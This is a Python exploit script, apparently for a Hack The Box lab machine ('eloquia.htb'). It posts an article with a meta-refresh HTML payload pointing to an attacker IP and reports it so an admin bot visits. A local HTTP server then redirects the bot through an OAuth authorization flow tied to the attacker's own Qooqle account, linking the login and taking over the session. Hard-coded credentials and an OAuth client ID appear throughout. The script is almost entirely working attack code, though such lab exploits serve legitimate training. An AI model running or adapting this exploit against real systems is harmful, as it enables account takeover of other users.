import re, threading, time, requests
from http.server import HTTPServer, BaseHTTPRequestHandler
from bs4 import BeautifulSoup

CONFIG = {
    "eloquia_url": "http://eloquia.htb",
    "qooqle_url": "http://qooqle.htb",
    "oauth_client_id": "riQBUyAa4UZT3Y1z1HUf3LY7Idyu8zgWaBj4zHIi",
    "oauth_redirect_uri": "http://eloquia.htb/accounts/oauth2/qooqle/callback/",
    "attacker_ip": "10.10.16.2",
    "port": 8080
}

CREDS = {"username": "ucup", "password": "ucup213."}

class CallbackHandler(BaseHTTPRequestHandler):
    done = False
    def log_message(self, *args): pass
    def do_GET(self):
        if "/test.html" in self.path:
            s = requests.Session()
            r = s.get(f"{CONFIG['qooqle_url']}/login/")
            csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name":"csrfmiddlewaretoken"})["value"]
            s.post(f"{CONFIG['qooqle_url']}/login/", data={"csrfmiddlewaretoken": csrf, **CREDS})

            auth_url = f"{CONFIG['qooqle_url']}/oauth2/authorize/?client_id={CONFIG['oauth_client_id']}&response_type=code&redirect_uri={CONFIG['oauth_redirect_uri']}"
            r = s.get(auth_url)
            csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name":"csrfmiddlewaretoken"})["value"]

            r = s.post(auth_url, data={
                "csrfmiddlewaretoken": csrf, "redirect_uri": CONFIG["oauth_redirect_uri"],
                "scope": "read write", "client_id": CONFIG["oauth_client_id"], "allow": "Authorize"
            }, allow_redirects=False)

            self.send_response(302)
            self.send_header("Location", r.headers.get("Location"))
            self.end_headers()
            CallbackHandler.done = True
        self.send_response(200); self.end_headers()

def main():
    threading.Thread(target=lambda: HTTPServer(("0.0.0.0", CONFIG["port"]), CallbackHandler).serve_forever(), daemon=True).start()
    s = requests.Session()

    r = s.get(f"{CONFIG['eloquia_url']}/accounts/login/")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name":"csrfmiddlewaretoken"})["value"]
    s.post(f"{CONFIG['eloquia_url']}/accounts/login/", data={"csrfmiddlewaretoken": csrf, **CREDS})

    r = s.get(f"{CONFIG['eloquia_url']}/article/create/")
    csrf = BeautifulSoup(r.text, "html.parser").find("input", {"name":"csrfmiddlewaretoken"})["value"]

    files = {"banner": ("img.jpg", b"fake", "image/jpeg")}
    payload = f'<meta http-equiv="refresh" content="0;url=http://{CONFIG["attacker_ip"]}:{CONFIG["port"]}/test.html">'

    r = s.post(f"{CONFIG['eloquia_url']}/article/create/", files=files, data={
        "csrfmiddlewaretoken": csrf, "title": "Exploit", "content": payload
    })

    match = re.search(r"article/(\d+)", r.url)
    if not match:
        print("[-] Failed to create article. Check credentials."); return

    aid = match.group(1)
    s.get(f"{CONFIG['eloquia_url']}/article/report/{aid}/")

    print(f"[*] Article {aid} reported. Waiting for bot...")
    while not CallbackHandler.done: time.sleep(1)
    print("[+] Success! Use 'Login with Qooqle' on Eloquia.")

if __name__ == "__main__":
    main()
